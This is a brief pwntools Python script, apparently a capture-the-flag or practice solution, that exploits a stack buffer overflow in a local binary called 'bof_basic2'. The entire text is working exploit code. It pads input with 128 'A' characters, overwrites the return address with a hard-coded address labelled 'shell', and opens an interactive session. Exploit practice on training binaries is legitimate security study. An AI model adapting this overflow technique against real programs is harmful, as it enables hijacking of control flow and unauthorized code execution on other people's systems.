from pwn import *

p = process("./bof_basic2")

shell = 0x804849b

payload = ''
payload += "A"*128
payload += p32(shell)

p.sendline(payload)
p.interactive()
